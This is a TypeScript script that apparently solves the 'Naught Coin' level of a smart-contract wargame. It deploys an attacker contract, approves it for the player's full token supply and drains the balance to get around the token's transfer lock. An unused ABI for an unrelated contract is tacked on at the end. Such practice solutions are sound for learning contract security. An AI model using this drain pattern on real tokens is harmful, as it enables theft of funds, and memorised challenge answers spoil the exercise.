// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { NaughtyCoin__factory } from "../typechain/ethers-v5";
import { NaughtyCoinAttacker__factory } from "../typechain";
import { createLevel, submitLevel } from './utils';

async function main() {
  const signer = getSigner();
  const level = await createLevel(signer, "Naught Coin");
  const coin = NaughtyCoin__factory.connect(level, signer);
  await coin.deployed();

  const player = await coin.player();
  const supply = await coin.INITIAL_SUPPLY();
  const balance = await coin.balanceOf(player);
  console.log(`Player: ${player}`);
  console.log(`Supply: ${supply}`);
  console.log(`Balance: ${balance}`);

  console.log("deploy NaughtyCoinAttacker");
  const attacker = await (new NaughtyCoinAttacker__factory(signer)).deploy(level);
  await attacker.deployed();
  console.log("attacker:", attacker.address);
  // give attacker the right
  await( await coin.approve(attacker.address, supply)).wait();
  console.log("aprrove done. Now withdraw");
  // attack
  await (await attacker.withdrawAll(balance)).wait();

  console.log("remain balances:", await coin.balanceOf(player));
  console.log("contract balances:", await coin.balanceOf(attacker.address));
  // The goal is to get all balance of player to 0.
  // So we do not care if contract transfer money to other or not.
  await submitLevel(signer, level);
}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]